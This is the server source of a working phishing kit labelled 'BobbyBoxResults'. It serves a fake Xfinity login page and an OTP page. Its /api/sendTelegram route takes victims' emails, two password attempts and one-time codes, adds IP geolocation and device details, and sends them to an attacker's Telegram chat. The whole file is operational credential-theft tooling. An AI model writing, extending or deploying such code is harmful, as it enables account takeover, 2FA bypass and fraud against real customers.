import express from 'express';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());

// --- Telegram API Configuration ---
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const FETCH_TIMEOUT = 15000;

const createTimeoutSignal = (ms) => {
  const controller = new AbortController();
  setTimeout(() => controller.abort(), ms);
  return controller.signal;
};

const getClientIp = (req) => {
  return (
    req.headers['x-forwarded-for'] ||
    req.headers['x-real-ip'] ||
    req.headers['cf-connecting-ip'] ||
    req.socket.remoteAddress ||
    'Unknown'
  ).toString().split(',')[0].trim();
};

const getIpAndLocation = async (ip) => {
  const location = { country: 'Unknown', regionName: 'Unknown' };
  if (ip === 'Unknown' || ip === '127.0.0.1' || ip === '::1') return location;
  try {
    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,query`, {
      signal: createTimeoutSignal(3000),
    });
    if (geoResponse.ok) {
      const geoJson = await geoResponse.json();
      location.country = geoJson.country || 'Unknown';
      location.regionName = geoJson.regionName || 'Unknown';
    }
  } catch (e) {
    console.error(`Geolocation lookup for IP ${ip} failed:`, e.message);
  }
  return location;
};

const getDeviceDetails = (userAgent) => {
  return {
    deviceType: /Mobile|Android|iPhone|iPad/i.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop',
    browser: 'Browser',
    os: 'OS',
  };
};

// Try to use ua-parser-js if available
let UAParser;
import('ua-parser-js').then(mod => {
  UAParser = mod.default || mod;
}).catch(() => {
  // ua-parser-js not available, use basic detection
});

const getDeviceDetailsWithParser = (userAgent) => {
  if (UAParser) {
    const uaParser = new UAParser(userAgent || '');
    const browser = uaParser.getBrowser();
    const os = uaParser.getOS();
    return {
      deviceType: /Mobile|Android|iPhone|iPad/i.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop',
      browser: browser.name ? `${browser.name} ${browser.version || ''}`.trim() : 'Unknown Browser',
      os: os.name ? `${os.name} ${os.version || ''}`.trim() : 'Unknown OS',
    };
  }
  return getDeviceDetails(userAgent);
};

const escapeMarkdown = (text) => {
  if (!text) return text;
  return String(text).replace(/\\/g, '\\\\').replace(/[_*`\[]/g, '\\$&');
};

const composeCredentialsMessage = (data) => {
  const {
    email, provider, firstAttemptPassword, secondAttemptPassword,
    clientIP, location, deviceDetails, timestamp, sessionId,
  } = data;

  const safeEmail = escapeMarkdown(email || 'Not captured');
  const safeFirstPw = escapeMarkdown(firstAttemptPassword);
  const safeSecondPw = escapeMarkdown(secondAttemptPassword);
  const safeProvider = escapeMarkdown(provider || 'Xfinity');
  const safeIP = escapeMarkdown(clientIP);
  const safeRegion = escapeMarkdown(location.regionName);
  const safeCountry = escapeMarkdown(location.country);
  const safeOS = escapeMarkdown(deviceDetails.os);
  const safeBrowser = escapeMarkdown(deviceDetails.browser);
  const safeDevice = escapeMarkdown(deviceDetails.deviceType);
  const safeSessionId = escapeMarkdown(sessionId);

  const passwordSection = `🔑 First (invalid): ${safeFirstPw}\n🔑 Second (valid): ${safeSecondPw}`;

  const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
    year: 'numeric', month: 'short', day: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    timeZone: 'UTC', hour12: true
  }) + ' UTC';

  return `
*🔐 BobbyBoxResults - Credentials 🔐*

*ACCOUNT DETAILS*
- 📧 Email: ${safeEmail}
- 🏢 Provider: *${safeProvider}*
- ${passwordSection}

*DEVICE & LOCATION*
- 📍 IP Address: ${safeIP}
- 🌍 Location: *${safeRegion}, ${safeCountry}*
- 💻 OS: *${safeOS}*
- 🌐 Browser: *${safeBrowser}*
- 🖥️ Device Type: *${safeDevice}*

*SESSION INFO*
- 🕒 Timestamp: *${formattedTimestamp}*
- 🆔 Session ID: ${safeSessionId}
`;
};

const composeOtpMessage = (data) => {
  const { otp, session } = data;
  const { email, provider, clientIP, sessionId } = session || {};

  const safeOtp = escapeMarkdown(otp);
  const safeEmail = escapeMarkdown(email || 'N/A');
  const safeProvider = escapeMarkdown(provider || 'N/A');
  const safeIP = escapeMarkdown(clientIP || 'N/A');
  const safeSessionId = escapeMarkdown(sessionId);

  const formattedTimestamp = new Date().toLocaleString('en-US', {
    year: 'numeric', month: 'short', day: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    timeZone: 'UTC', hour12: true
  }) + ' UTC';

  return `
*🔑 BobbyBoxResults - OTP Code 🔑*

*VERIFICATION CODE*
- 🔢 OTP Code: ${safeOtp}

*ASSOCIATED SESSION*
- 📧 Email: ${safeEmail}
- 🏢 Provider: *${safeProvider}*
- 📍 IP Address: ${safeIP}
- 🆔 Session ID: ${safeSessionId}

*SUBMITTED AT*
- 🕒 Timestamp: *${formattedTimestamp}*
`;
};

// --- Simple rate limiter ---
const rateLimitMap = new Map();
const RATE_LIMIT_WINDOW = 60 * 1000; // 1 minute
const RATE_LIMIT_MAX = 10; // max requests per window per IP

const rateLimit = (req, res, next) => {
  const ip = getClientIp(req);
  const now = Date.now();
  const entry = rateLimitMap.get(ip);

  if (!entry || now - entry.start > RATE_LIMIT_WINDOW) {
    rateLimitMap.set(ip, { start: now, count: 1 });
    return next();
  }

  entry.count++;
  if (entry.count > RATE_LIMIT_MAX) {
    return res.status(429).json({ error: 'Too many requests.' });
  }
  return next();
};

// --- API Routes ---

app.post('/api/sendTelegram', rateLimit, async (req, res) => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('FATAL: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars.');
    return res.status(500).json({ success: false, message: 'Server misconfiguration.' });
  }

  try {
    const { type, data } = req.body;
    let message;

    if (type === 'credentials') {
      const clientIP = getClientIp(req);
      const location = await getIpAndLocation(clientIP);
      const deviceDetails = getDeviceDetailsWithParser(data.userAgent);
      const messageData = { ...data, clientIP, location, deviceDetails };
      message = composeCredentialsMessage(messageData);
    } else if (type === 'otp') {
      message = composeOtpMessage(data);
    } else {
      const clientIP = getClientIp(req);
      const location = await getIpAndLocation(clientIP);
      const deviceDetails = getDeviceDetailsWithParser(req.body.userAgent);
      const sessionId = req.body.sessionId || Math.random().toString(36).substring(2, 15);
      message = composeCredentialsMessage({ ...req.body, clientIP, location, deviceDetails, sessionId });
    }

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }),
      signal: createTimeoutSignal(FETCH_TIMEOUT),
    });

    if (!telegramResponse.ok) {
      const errorResult = await telegramResponse.json().catch(() => ({ description: 'Failed to parse Telegram error response.' }));
      console.error('Telegram API Error:', errorResult.description);
      return res.status(502).json({ success: false, error: 'Failed to send message.' });
    }

    return res.json({ success: true, sessionId: data?.sessionId });
  } catch (error) {
    console.error('Function execution error:', error.message);
    return res.status(500).json({ error: 'An internal server error occurred.' });
  }
});

// --- Static File Serving ---
const distPath = join(__dirname, 'dist');

// Serve static files from dist/ with correct MIME types for .js.download files
app.use(express.static(distPath, {
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.js.download')) {
      res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    }
  },
}));

// Serve the Xfinity login page at root
app.get('/', (req, res) => {
  res.sendFile(join(distPath, 'login.html'));
});

// SPA fallback - for /password, /otp and other React routes
app.get('*', (req, res) => {
  // If the request is for a file that exists in dist, it was already served by express.static
  // Otherwise, serve index.html for the React SPA to handle client-side routing
  res.sendFile(join(distPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
